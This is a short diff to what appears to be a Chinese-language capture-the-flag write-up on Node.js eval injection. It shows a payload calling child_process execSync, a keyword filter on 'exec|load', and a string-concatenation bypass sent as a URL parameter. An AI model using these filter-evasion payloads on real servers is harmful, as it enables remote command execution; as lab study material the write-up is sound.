@@ -32,7 +32,7 @@ eval(require("child_process").execSync('ls'))
 ```
 
 ^
-有过滤exec|load
+有过滤exec|load。函数evalstring.search(/exec|load/i)
 ```
 构造exec
 ?eval=require("child_process")['exe'%2B'cSync']('ls')
